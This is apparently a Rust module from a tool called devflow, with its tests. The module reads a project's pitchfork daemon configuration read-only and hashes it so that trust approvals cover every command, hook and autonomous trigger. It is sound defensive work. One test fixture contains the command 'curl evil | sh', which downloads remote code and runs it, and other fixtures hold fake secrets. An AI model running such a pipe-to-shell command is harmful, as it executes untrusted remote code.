//! The pitchfork configuration of a project, read for the trust scope.
//!
//! pitchfork runs whatever a worktree's `pitchfork.toml` says: daemon
//! commands, lifecycle hooks and, without anyone starting them, `cron`,
//! `watch`, `boot_start` and `auto` triggers. An approval therefore has to
//! cover those files, so this module reads them the way an auditor would:
//! read-only, bounded, never executing anything, never following a link out
//! of the project, and without interpreting more than needed. Every field of
//! every daemon is kept (a command-bearing field pitchfork adds later is
//! covered without a change here), so any edit to what pitchfork would read
//! changes the digest.
//!
//! Files are read per directory in pitchfork's order, lowest precedence
//! first: `.config/pitchfork.toml`, `.config/pitchfork.local.toml`,
//! `pitchfork.toml`, `pitchfork.local.toml`. devflow does not merge them: a
//! later file overrides an earlier one in pitchfork, so every layer is part
//! of the scope as it is. Only the project's own directory is read; pitchfork
//! also reads its user and system configuration and the files of parent
//! directories, which belong to the user, not to the repository.
use serde::Serialize;
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::io::Read;
use std::path::{Path, PathBuf};

/// pitchfork's project files, lowest precedence first.
pub const LAYERS: [&str; 4] = [
    ".config/pitchfork.toml",
    ".config/pitchfork.local.toml",
    "pitchfork.toml",
    "pitchfork.local.toml",
];

/// Files larger than this are not parsed (their hash is still part of the scope).
pub const MAX_BYTES: u64 = 1 << 20;

/// Files are hashed whole, as a stream, up to this size. A larger file cannot
/// be bound to an approval by its content, so the scope refuses approval
/// ([`ProcessesScope::unapprovable`]) instead of hashing a prefix of it.
pub const MAX_HASHED_BYTES: u64 = 256 << 20;

/// How much of a file is parsed and how much is hashed; see [`MAX_BYTES`] and
/// [`MAX_HASHED_BYTES`].
#[derive(Debug, Clone, Copy)]
struct Limits {
    parse: u64,
    hash: u64,
}

const LIMITS: Limits = Limits {
    parse: MAX_BYTES,
    hash: MAX_HASHED_BYTES,
};

/// What devflow generated for one workspace and writes into its
/// `pitchfork.local.toml`: the namespace (`df-<project8>-<instance8>`, from the
/// receipt) and the label (the directory name). They only name the checkout,
/// so exactly these two values are left out of the scope, which keeps writing
/// the file from changing a digest.
///
/// Any other `namespace` or `worktree_label`, in any file, is part of the
/// scope like every other key: a namespace decides which daemons pitchfork
/// attributes to the workspace (and which a stop reaches), so an edit that
/// points it at another workspace's must not keep the approval.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Identity {
    pub namespace: String,
    pub label: String,
}

impl Identity {
    /// Whether `key = value` is one of the two values devflow generated.
    fn generated(&self, key: &str, value: &toml::Value) -> bool {
        match key {
            "namespace" => value.as_str() == Some(self.namespace.as_str()),
            "worktree_label" => value.as_str() == Some(self.label.as_str()),
            _ => false,
        }
    }
}

/// A TOML value in a canonical form: tables are sorted and floats are text,
/// so equal content always serializes to equal bytes.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(untagged)]
pub enum Item {
    Bool(bool),
    Int(i64),
    /// Floats and datetimes, as TOML writes them.
    Text(String),
    List(Vec<Item>),
    Table(BTreeMap<String, Item>),
}

impl Item {
    fn from_toml(value: &toml::Value) -> Item {
        match value {
            toml::Value::String(text) => Item::Text(text.clone()),
            toml::Value::Integer(n) => Item::Int(*n),
            toml::Value::Float(f) => Item::Text(f.to_string()),
            toml::Value::Boolean(b) => Item::Bool(*b),
            toml::Value::Datetime(d) => Item::Text(d.to_string()),
            toml::Value::Array(items) => Item::List(items.iter().map(Item::from_toml).collect()),
            toml::Value::Table(table) => Item::Table(
                table
                    .iter()
                    .map(|(key, value)| (key.clone(), Item::from_toml(value)))
                    .collect(),
            ),
        }
    }

    /// Text as written, anything else as compact JSON: for showing a value.
    pub fn display(&self) -> String {
        match self {
            Item::Text(text) => text.clone(),
            other => serde_json::to_string(other).unwrap_or_default(),
        }
    }

    /// `false`, `""`, `[]` and `{}` configure nothing.
    fn is_set(&self) -> bool {
        match self {
            Item::Bool(on) => *on,
            Item::Int(_) => true,
            Item::Text(text) => !text.is_empty(),
            Item::List(items) => !items.is_empty(),
            Item::Table(table) => !table.is_empty(),
        }
    }
}

/// One daemon of a layer.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Daemon {
    pub id: String,
    /// The command, when it is a string.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub run: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub dir: Option<String>,
    /// Every other field as written: `env`, `hooks`, `cron`, `watch`,
    /// `boot_start`, `auto`, `depends`, `ready_*`, `health_*`, `user`, …
    pub fields: BTreeMap<String, Item>,
    /// The autonomous triggers this daemon has (`cron`, `watch`,
    /// `boot_start`, `auto`): ways pitchfork starts it without devflow.
    pub triggers: Vec<String>,
}

/// One file.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Layer {
    /// Relative to the project directory.
    pub file: String,
    pub daemons: Vec<Daemon>,
    /// Top-level content other than `daemons`: `env` (applied to every
    /// daemon), `groups`, `settings`, …
    pub shared: BTreeMap<String, Item>,
    /// Why the file could not be read as pitchfork configuration. Its bytes
    /// are then covered by `sha256` instead.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub problem: Option<String>,
    /// SHA-256 (hex) of the whole file, set only when `problem` is (and the
    /// file could be read and hashed to its end).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub sha256: Option<String>,
    /// The file is too large to hash, so no digest can stand for its content.
    /// An approval of a scope with such a layer is refused.
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    pub unbound: bool,
}

/// A way pitchfork starts a daemon on its own.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Trigger {
    pub file: String,
    pub daemon: String,
    /// `cron`, `watch`, `boot_start` or `auto`.
    pub trigger: String,
}

/// Everything pitchfork would read in a project directory.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
pub struct ProcessesScope {
    /// The files that have something in them, lowest precedence first.
    pub layers: Vec<Layer>,
    /// The autonomous triggers of all layers. When this is not empty,
    /// pitchfork can run daemons before anyone asks.
    pub autonomous: Vec<Trigger>,
}

impl ProcessesScope {
    /// Nothing for pitchfork to run or to read.
    pub fn is_empty(&self) -> bool {
        self.layers.is_empty()
    }

    /// Why this scope cannot be approved: a file whose content no digest can
    /// stand for because it is too large to hash. `None` when every file is
    /// bound by what it says or by its complete content.
    pub fn unapprovable(&self) -> Option<String> {
        self.layers.iter().find(|layer| layer.unbound).map(|layer| {
            format!(
                "{} is larger than {} MiB, too large for an approval to be bound to its content;                  reduce the file or run once with DEVFLOW_TRUST_HOOKS=1",
                layer.file,
                MAX_HASHED_BYTES >> 20
            )
        })
    }

    /// Read the layers in `dir`. Nothing is left out: a `namespace` or
    /// `worktree_label` counts, as there is no generated value to compare it
    /// with (see [`ProcessesScope::read_for`]).
    pub fn read(dir: &Path) -> ProcessesScope {
        Self::read_with(dir, LIMITS, None)
    }

    /// Read the layers in `dir`, leaving out the `namespace` and
    /// `worktree_label` that equal `identity`'s generated values.
    pub fn read_for(dir: &Path, identity: Option<&Identity>) -> ProcessesScope {
        Self::read_with(dir, LIMITS, identity)
    }

    fn read_with(dir: &Path, limits: Limits, identity: Option<&Identity>) -> ProcessesScope {
        let root = dir.canonicalize().unwrap_or_else(|_| dir.to_path_buf());
        let layers: Vec<Layer> = LAYERS
            .iter()
            .filter_map(|file| read_layer(&root, file, limits, identity))
            .collect();
        let autonomous = layers
            .iter()
            .flat_map(|layer| {
                layer.daemons.iter().flat_map(|daemon| {
                    daemon.triggers.iter().map(|trigger| Trigger {
                        file: layer.file.clone(),
                        daemon: daemon.id.clone(),
                        trigger: trigger.clone(),
                    })
                })
            })
            .collect();
        ProcessesScope { layers, autonomous }
    }
}

fn hex(digest: impl AsRef<[u8]>) -> String {
    digest.as_ref().iter().map(|b| format!("{b:02x}")).collect()
}

/// A layer that could not be read: what is wrong, and the content's hash if any.
fn unreadable(file: &str, problem: impl Into<String>, sha256: Option<String>) -> Layer {
    Layer {
        file: file.to_string(),
        daemons: Vec::new(),
        shared: BTreeMap::new(),
        problem: Some(problem.into()),
        sha256,
        unbound: false,
    }
}

/// Where a layer's file is.
enum Located {
    Missing,
    /// Some component is a link that does not resolve (or loops).
    Dangling,
    Unreadable(std::io::ErrorKind),
    /// `real` is the file after resolving every link on its way; `outside`
    /// says it is not inside the project directory.
    Found {
        real: PathBuf,
        outside: bool,
    },
}

/// Resolve `file` below `root`, looking at every component, not only the
/// last: a link anywhere on the way (`.config -> /elsewhere`) counts. pitchfork
/// follows links; devflow follows them inside the project only, and never
/// shows what lies outside it.
fn locate(root: &Path, file: &str) -> Located {
    let mut path = root.to_path_buf();
    let mut linked = false;
    for part in file.split('/') {
        path.push(part);
        match path.symlink_metadata() {
            Ok(meta) => linked |= meta.file_type().is_symlink(),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Located::Missing,
            Err(e) => return Located::Unreadable(e.kind()),
        }
    }
    if !linked {
        return Located::Found {
            real: path,
            outside: false,
        };
    }
    match path.canonicalize() {
        Ok(real) => Located::Found {
            outside: !real.starts_with(root),
            real,
        },
        Err(_) => Located::Dangling,
    }
}

/// The file read once: the whole of it is hashed, as a stream; the first
/// `limits.parse` bytes are kept for parsing.
struct Content {
    head: Vec<u8>,
    sha256: String,
    /// More than `limits.parse` bytes: `head` is only the start.
    truncated: bool,
}

enum Slurp {
    Content(Content),
    /// More than `limits.hash` bytes: the file cannot be hashed whole.
    TooLarge,
    Failed(std::io::ErrorKind),
}

fn read_content(real: &Path, limits: Limits) -> Slurp {
    let mut file = match std::fs::File::open(real) {
        Ok(file) => file,
        Err(e) => return Slurp::Failed(e.kind()),
    };
    // The handle that is read is the one that is checked.
    match file.metadata() {
        Ok(meta) if meta.is_file() => {}
        Ok(_) => return Slurp::Failed(std::io::ErrorKind::InvalidInput),
        Err(e) => return Slurp::Failed(e.kind()),
    }
    let mut hasher = Sha256::new();
    let mut head = Vec::new();
    let mut total: u64 = 0;
    let mut chunk = [0u8; 64 * 1024];
    loop {
        let n = match file.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => n,
            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(e) => return Slurp::Failed(e.kind()),
        };
        total += n as u64;
        if total > limits.hash {
            return Slurp::TooLarge;
        }
        hasher.update(&chunk[..n]);
        let room = (limits.parse + 1).saturating_sub(head.len() as u64) as usize;
        head.extend_from_slice(&chunk[..n.min(room)]);
    }
    Slurp::Content(Content {
        truncated: total > limits.parse,
        head,
        sha256: hex(hasher.finalize()),
    })
}

fn read_layer(
    root: &Path,
    file: &str,
    limits: Limits,
    identity: Option<&Identity>,
) -> Option<Layer> {
    let (real, outside) = match locate(root, file) {
        Located::Missing => return None,
        Located::Dangling => {
            return Some(unreadable(file, "is a link that does not resolve", None));
        }
        Located::Unreadable(kind) => {
            return Some(unreadable(
                file,
                format!("cannot be inspected ({kind})"),
                None,
            ));
        }
        Located::Found { real, outside } => (real, outside),
    };
    match real.metadata() {
        Ok(meta) if meta.is_file() => {}
        Ok(_) => return Some(unreadable(file, "is not a regular file", None)),
        Err(e) => {
            return Some(unreadable(
                file,
                format!("cannot be inspected ({})", e.kind()),
                None,
            ));
        }
    }
    let content = match read_content(&real, limits) {
        Slurp::Content(content) => content,
        Slurp::TooLarge => {
            let mut layer = unreadable(
                file,
                format!(
                    "is larger than {} MiB and cannot be approved",
                    limits.hash >> 20
                ),
                None,
            );
            layer.unbound = true;
            return Some(layer);
        }
        Slurp::Failed(kind) => {
            return Some(unreadable(file, format!("cannot be read ({kind})"), None));
        }
    };
    let sha = Some(content.sha256.clone());
    if outside {
        return Some(unreadable(
            file,
            format!(
                "is a link to {}, outside the project; its content is not shown",
                real.display()
            ),
            sha,
        ));
    }
    if content.truncated {
        return Some(unreadable(
            file,
            format!(
                "is larger than {} KiB and was not parsed",
                limits.parse / 1024
            ),
            sha,
        ));
    }
    let bytes = content.head;
    let Ok(text) = std::str::from_utf8(&bytes) else {
        return Some(unreadable(file, "is not valid UTF-8", sha));
    };
    let table = match toml::from_str::<toml::Table>(text) {
        Ok(table) => table,
        Err(e) => {
            // The message and position only: never a piece of the file.
            let at = e
                .span()
                .map(|s| format!(" at bytes {}..{}", s.start, s.end))
                .unwrap_or_default();
            return Some(unreadable(
                file,
                format!("is not valid TOML ({}{at})", e.message()),
                sha,
            ));
        }
    };
    parse_layer(file, &table, sha, identity)
}

fn parse_layer(
    file: &str,
    table: &toml::Table,
    sha: Option<String>,
    identity: Option<&Identity>,
) -> Option<Layer> {
    let mut daemons = Vec::new();
    let mut shared = BTreeMap::new();
    for (key, value) in table {
        if identity.is_some_and(|identity| identity.generated(key, value)) {
            continue;
        }
        if key != "daemons" {
            shared.insert(key.clone(), Item::from_toml(value));
            continue;
        }
        let Some(entries) = value.as_table() else {
            return Some(unreadable(file, "`daemons` is not a table", sha));
        };
        for (id, daemon) in entries {
            let Some(daemon) = daemon.as_table() else {
                return Some(unreadable(
                    file,
                    format!("daemons.{id} is not a table"),
                    sha,
                ));
            };
            daemons.push(parse_daemon(id, daemon));
        }
    }
    if daemons.is_empty() && shared.is_empty() {
        return None;
    }
    Some(Layer {
        file: file.to_string(),
        daemons,
        shared,
        problem: None,
        sha256: None,
        unbound: false,
    })
}

fn parse_daemon(id: &str, table: &toml::Table) -> Daemon {
    let mut fields: BTreeMap<String, Item> = table
        .iter()
        .map(|(key, value)| (key.clone(), Item::from_toml(value)))
        .collect();
    let text = |fields: &mut BTreeMap<String, Item>, key: &str| match fields.get(key) {
        Some(Item::Text(text)) => {
            let text = text.clone();
            fields.remove(key);
            Some(text)
        }
        _ => None,
    };
    let run = text(&mut fields, "run");
    let dir = text(&mut fields, "dir");
    let mut triggers = Vec::new();
    for key in ["cron", "watch", "boot_start", "auto"] {
        if fields.get(key).is_some_and(Item::is_set) {
            triggers.push(key.to_string());
        }
    }
    Daemon {
        id: id.to_string(),
        run,
        dir,
        fields,
        triggers,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write(dir: &Path, file: &str, text: &str) {
        let path = dir.join(file);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    fn read(dir: &Path) -> ProcessesScope {
        ProcessesScope::read(dir)
    }

    #[test]
    fn a_directory_without_pitchfork_files_has_nothing_to_approve() {
        let dir = tempfile::tempdir().unwrap();
        assert!(read(dir.path()).is_empty());
        // Files that only name the checkout with the values devflow generated
        // for it do not count.
        write(
            dir.path(),
            "pitchfork.local.toml",
            "namespace = \"df-0b3c9d2e-a1b2c3d4\"\nworktree_label = \"feature-a\"\n",
        );
        let generated = Identity {
            namespace: "df-0b3c9d2e-a1b2c3d4".into(),
            label: "feature-a".into(),
        };
        assert!(ProcessesScope::read_for(dir.path(), Some(&generated)).is_empty());
        // With nothing to compare them with, they do.
        assert!(!read(dir.path()).is_empty());
    }

    #[test]
    fn only_the_values_devflow_generated_are_left_out_of_the_scope() {
        let dir = tempfile::tempdir().unwrap();
        let generated = Identity {
            namespace: "df-0b3c9d2e-a1b2c3d4".into(),
            label: "feature-a".into(),
        };
        write(
            dir.path(),
            "pitchfork.toml",
            "[daemons.api]\nrun = \"bun run dev\"\n",
        );
        let digest = |scope: &ProcessesScope| serde_json::to_string(scope).unwrap();
        let plain = ProcessesScope::read_for(dir.path(), Some(&generated));

        // Writing the file with the generated values changes nothing.
        write(
            dir.path(),
            "pitchfork.local.toml",
            "namespace = \"df-0b3c9d2e-a1b2c3d4\"\nworktree_label = \"feature-a\"\n",
        );
        assert_eq!(
            digest(&ProcessesScope::read_for(dir.path(), Some(&generated))),
            digest(&plain)
        );

        // Any other value counts, in the local file or in a committed one:
        // another workspace's namespace, another label, the same value in
        // a layer devflow does not write.
        for (file, text) in [
            (
                "pitchfork.local.toml",
                "namespace = \"df-0b3c9d2e-ffffffff\"\nworktree_label = \"feature-a\"\n",
            ),
            (
                "pitchfork.local.toml",
                "namespace = \"df-0b3c9d2e-a1b2c3d4\"\nworktree_label = \"somebody-else\"\n",
            ),
            ("pitchfork.local.toml", "namespace = \"shop\"\n"),
            (
                ".config/pitchfork.local.toml",
                "namespace = \"df-0b3c9d2e-ffffffff\"\n",
            ),
        ] {
            std::fs::remove_file(dir.path().join("pitchfork.local.toml")).ok();
            write(dir.path(), file, text);
            let scope = ProcessesScope::read_for(dir.path(), Some(&generated));
            assert_ne!(digest(&scope), digest(&plain), "{file}: {text}");
            assert!(
                scope
                    .layers
                    .iter()
                    .any(|layer| layer.shared.contains_key("namespace")
                        || layer.shared.contains_key("worktree_label")),
                "{file}: {text}"
            );
            std::fs::remove_file(dir.path().join(file)).unwrap();
        }
    }

    #[test]
    fn every_daemon_field_is_kept_and_layers_stay_in_pitchfork_order() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "pitchfork.toml",
            r#"
[daemons.api]
run = "mise exec -- bun run dev"
dir = "web"
env = { PORT = "3000", TOKEN = "abc" }
depends = ["db"]
ready_http = "http://localhost:3000/health"
ready_delay = 3
retry = 2
[daemons.api.hooks]
on_ready = "echo up"
on_stop = "echo down"

[env]
SHARED = "1"
"#,
        );
        write(
            dir.path(),
            "pitchfork.local.toml",
            "[daemons.api]\nrun = \"echo mine\"\n",
        );
        write(
            dir.path(),
            ".config/pitchfork.toml",
            "[daemons.low]\nrun = \"echo low\"\n",
        );
        let scope = read(dir.path());
        let files: Vec<_> = scope.layers.iter().map(|l| l.file.as_str()).collect();
        assert_eq!(
            files,
            [
                ".config/pitchfork.toml",
                "pitchfork.toml",
                "pitchfork.local.toml"
            ],
            "lowest precedence first, local last"
        );
        let api = &scope.layers[1].daemons[0];
        assert_eq!(api.id, "api");
        assert_eq!(api.run.as_deref(), Some("mise exec -- bun run dev"));
        assert_eq!(api.dir.as_deref(), Some("web"));
        for key in [
            "env",
            "depends",
            "ready_http",
            "ready_delay",
            "retry",
            "hooks",
        ] {
            assert!(api.fields.contains_key(key), "{key} in {:?}", api.fields);
        }
        let Item::Table(hooks) = &api.fields["hooks"] else {
            panic!("hooks is a table");
        };
        assert_eq!(hooks["on_stop"], Item::Text("echo down".into()));
        assert_eq!(scope.layers[1].shared["env"].display(), r#"{"SHARED":"1"}"#);
        assert_eq!(scope.layers[2].daemons[0].run.as_deref(), Some("echo mine"));
        assert!(scope.autonomous.is_empty());
    }

    #[test]
    fn autonomous_triggers_are_found_in_any_layer_and_named() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "pitchfork.toml",
            r#"
[daemons.plain]
run = "echo plain"
boot_start = false
watch = []
[daemons.nightly]
run = "echo nightly"
cron = { schedule = "0 3 * * *", retrigger = "finish" }
[daemons.dev]
run = "echo dev"
watch = ["src/**/*.rs"]
auto = ["start", "stop"]
[daemons.boot]
run = "echo boot"
boot_start = true
"#,
        );
        write(
            dir.path(),
            "pitchfork.local.toml",
            "[daemons.mine]\nrun = \"echo mine\"\ncron = \"0 * * * *\"\n",
        );
        let scope = read(dir.path());
        let found: Vec<_> = scope
            .autonomous
            .iter()
            .map(|t| format!("{}:{}:{}", t.file, t.daemon, t.trigger))
            .collect();
        assert_eq!(
            found,
            [
                "pitchfork.toml:boot:boot_start",
                "pitchfork.toml:dev:watch",
                "pitchfork.toml:dev:auto",
                "pitchfork.toml:nightly:cron",
                "pitchfork.local.toml:mine:cron",
            ]
        );
        let plain = scope.layers[0]
            .daemons
            .iter()
            .find(|d| d.id == "plain")
            .unwrap();
        assert!(
            plain.triggers.is_empty(),
            "`false` and `[]` trigger nothing"
        );
    }

    #[test]
    fn what_cannot_be_read_is_reported_and_still_bound_by_its_bytes() {
        let dir = tempfile::tempdir().unwrap();
        write(
            dir.path(),
            "pitchfork.toml",
            "[daemons.api\nrun = \"secret-token-in-a-broken-file\"\n",
        );
        let scope = read(dir.path());
        let layer = &scope.layers[0];
        let problem = layer.problem.as_deref().unwrap();
        assert!(
            problem.contains("not valid TOML") && problem.contains("at bytes"),
            "{problem}"
        );
        assert!(
            !problem.contains("secret-token"),
            "an error never quotes the file: {problem}"
        );
        let first = layer.sha256.clone().unwrap();
        assert_eq!(first.len(), 64);
        // A change to the unreadable file is a change to the scope.
        write(
            dir.path(),
            "pitchfork.toml",
            "[daemons.api\nrun = \"other\"\n",
        );
        assert_ne!(
            read(dir.path()).layers[0].sha256.as_deref(),
            Some(first.as_str())
        );
        // Other shapes.
        write(dir.path(), "pitchfork.toml", "daemons = 3\n");
        assert!(
            read(dir.path()).layers[0]
                .problem
                .as_deref()
                .unwrap()
                .contains("not a table")
        );
        write(dir.path(), "pitchfork.toml", "[daemons]\napi = \"echo\"\n");
        assert!(
            read(dir.path()).layers[0]
                .problem
                .as_deref()
                .unwrap()
                .contains("daemons.api")
        );
        std::fs::write(dir.path().join("pitchfork.toml"), [0xff, 0xfe, 0x00]).unwrap();
        assert!(
            read(dir.path()).layers[0]
                .problem
                .as_deref()
                .unwrap()
                .contains("UTF-8")
        );
        // Directories and oversized files are not parsed.
        std::fs::remove_file(dir.path().join("pitchfork.toml")).unwrap();
        std::fs::create_dir(dir.path().join("pitchfork.toml")).unwrap();
        assert!(
            read(dir.path()).layers[0]
                .problem
                .as_deref()
                .unwrap()
                .contains("regular file")
        );
        std::fs::remove_dir(dir.path().join("pitchfork.toml")).unwrap();
        let big = format!(
            "# {}\n[daemons.a]\nrun = \"x\"\n",
            "x".repeat(MAX_BYTES as usize)
        );
        write(dir.path(), "pitchfork.toml", &big);
        let layer = &read(dir.path()).layers[0];
        assert!(layer.problem.as_deref().unwrap().contains("not parsed"));
        assert!(layer.sha256.is_some() && layer.daemons.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn links_are_followed_inside_the_project_and_never_outside() {
        use std::os::unix::fs::symlink;
        let outside = tempfile::tempdir().unwrap();
        std::fs::write(
            outside.path().join("elsewhere.toml"),
            "[default]\naws_secret_access_key = \"hunter2hunter2\"\n",
        )
        .unwrap();
        let dir = tempfile::tempdir().unwrap();
        // Inside: shown like any file.
        write(
            dir.path(),
            "config/shared.toml",
            "[daemons.a]\nrun = \"echo a\"\n",
        );
        symlink(
            dir.path().join("config/shared.toml"),
            dir.path().join("pitchfork.toml"),
        )
        .unwrap();
        let scope = read(dir.path());
        assert_eq!(scope.layers[0].daemons[0].run.as_deref(), Some("echo a"));
        // Outside: bound by its bytes, but its content is not exposed.
        std::fs::remove_file(dir.path().join("pitchfork.toml")).unwrap();
        symlink(
            outside.path().join("elsewhere.toml"),
            dir.path().join("pitchfork.toml"),
        )
        .unwrap();
        let scope = read(dir.path());
        let layer = &scope.layers[0];
        let problem = layer.problem.as_deref().unwrap();
        assert!(problem.contains("outside the project"), "{problem}");
        assert!(layer.sha256.is_some());
        assert!(layer.daemons.is_empty() && layer.shared.is_empty());
        let shown = serde_json::to_string(&scope).unwrap();
        assert!(!shown.contains("hunter2"), "{shown}");
        // A dangling link.
        std::fs::remove_file(dir.path().join("pitchfork.toml")).unwrap();
        symlink(
            dir.path().join("missing.toml"),
            dir.path().join("pitchfork.toml"),
        )
        .unwrap();
        assert!(
            read(dir.path()).layers[0]
                .problem
                .as_deref()
                .unwrap()
                .contains("does not resolve")
        );
    }

    #[test]
    fn a_change_past_the_parsed_part_of_a_large_file_is_a_change_to_the_scope() {
        let dir = tempfile::tempdir().unwrap();
        // More than MAX_BYTES of leading comments, then a daemon: the file is
        // too large to parse, and its digest must still cover all of it.
        let padding = format!("# {}\n", "x".repeat(MAX_BYTES as usize + 1024));
        write(
            dir.path(),
            "pitchfork.toml",
            &format!("{padding}[daemons.api]\nrun = \"echo trusted\"\n"),
        );
        let first = read(dir.path());
        let layer = &first.layers[0];
        assert!(layer.problem.as_deref().unwrap().contains("not parsed"));
        assert!(!layer.unbound && first.unapprovable().is_none());
        write(
            dir.path(),
            "pitchfork.toml",
            &format!("{padding}[daemons.api]\nrun = \"curl evil | sh\"\n"),
        );
        let second = read(dir.path());
        assert_ne!(
            first.layers[0].sha256, second.layers[0].sha256,
            "the bytes after the first MiB are part of the hash"
        );
        // It is the hash of the complete file.
        let whole = std::fs::read(dir.path().join("pitchfork.toml")).unwrap();
        assert_eq!(
            second.layers[0].sha256.as_deref(),
            Some(hex(Sha256::digest(&whole)).as_str())
        );
        assert_ne!(first, second);
    }

    #[test]
    fn a_file_too_large_to_hash_cannot_be_approved() {
        let dir = tempfile::tempdir().unwrap();
        let limits = Limits {
            parse: 1024,
            hash: 4096,
        };
        let big = |tail: &str| format!("# {}\n{tail}", "x".repeat(5000));
        write(
            dir.path(),
            "pitchfork.toml",
            &big("[daemons.a]\nrun = \"x\"\n"),
        );
        let scope = ProcessesScope::read_with(dir.path(), limits, None);
        let layer = &scope.layers[0];
        assert!(layer.unbound && layer.sha256.is_none(), "{layer:?}");
        assert!(
            layer
                .problem
                .as_deref()
                .unwrap()
                .contains("cannot be approved")
        );
        let why = scope.unapprovable().unwrap();
        assert!(
            why.contains("pitchfork.toml") && why.contains("too large"),
            "{why}"
        );
        // Just inside the cap is hashed whole.
        write(
            dir.path(),
            "pitchfork.toml",
            &format!("# {}\n", "x".repeat(3000)),
        );
        let scope = ProcessesScope::read_with(dir.path(), limits, None);
        assert!(scope.unapprovable().is_none());
        assert!(scope.layers[0].sha256.is_some());
    }

    #[cfg(unix)]
    #[test]
    fn a_link_anywhere_on_the_way_is_checked_not_only_the_last_component() {
        use std::os::unix::fs::symlink;
        let outside = tempfile::tempdir().unwrap();
        std::fs::write(
            outside.path().join("pitchfork.toml"),
            "[daemons.leak]\nrun = \"echo hunter2hunter2\"\n",
        )
        .unwrap();
        let dir = tempfile::tempdir().unwrap();
        // `.config` itself is the link; the file below it is a plain file.
        symlink(outside.path(), dir.path().join(".config")).unwrap();
        let scope = read(dir.path());
        assert_eq!(scope.layers.len(), 1);
        let layer = &scope.layers[0];
        assert_eq!(layer.file, ".config/pitchfork.toml");
        let problem = layer.problem.as_deref().unwrap();
        assert!(problem.contains("outside the project"), "{problem}");
        assert!(layer.sha256.is_some(), "bound by its bytes");
        assert!(layer.daemons.is_empty() && layer.shared.is_empty());
        assert!(scope.autonomous.is_empty());
        let shown = serde_json::to_string(&scope).unwrap();
        assert!(
            !shown.contains("hunter2") && !shown.contains("leak"),
            "{shown}"
        );
        // The hash follows the external content.
        let before = layer.sha256.clone();
        std::fs::write(
            outside.path().join("pitchfork.toml"),
            "[daemons.leak]\nrun = \"echo other\"\n",
        )
        .unwrap();
        assert_ne!(read(dir.path()).layers[0].sha256, before);

        // A directory link that stays inside the project is read like a directory.
        std::fs::remove_file(dir.path().join(".config")).unwrap();
        write(
            dir.path(),
            "shared/pitchfork.toml",
            "[daemons.a]\nrun = \"echo a\"\n",
        );
        symlink(dir.path().join("shared"), dir.path().join(".config")).unwrap();
        let scope = read(dir.path());
        assert_eq!(scope.layers[0].daemons[0].run.as_deref(), Some("echo a"));

        // A link in the middle of the path to a place outside, one level down.
        std::fs::remove_file(dir.path().join(".config")).unwrap();
        std::fs::create_dir(dir.path().join(".config")).unwrap();
        assert!(read(dir.path()).is_empty());
        std::fs::remove_dir(dir.path().join(".config")).unwrap();
        // A dangling directory link holds nothing.
        symlink(dir.path().join("missing"), dir.path().join(".config")).unwrap();
        assert!(read(dir.path()).is_empty());
    }

    #[test]
    fn the_same_content_always_serializes_the_same() {
        let a = tempfile::tempdir().unwrap();
        let b = tempfile::tempdir().unwrap();
        write(
            a.path(),
            "pitchfork.toml",
            "[daemons.x]\nrun = \"r\"\nenv = { B = \"2\", A = \"1\" }\nzzz = 1.5\n",
        );
        write(
            b.path(),
            "pitchfork.toml",
            "[daemons.x]\nzzz = 1.5\nenv = { A = \"1\", B = \"2\" }\nrun = \"r\"\n",
        );
        assert_eq!(
            serde_json::to_vec(&read(a.path())).unwrap(),
            serde_json::to_vec(&read(b.path())).unwrap(),
            "key order in the file does not matter"
        );
    }
}
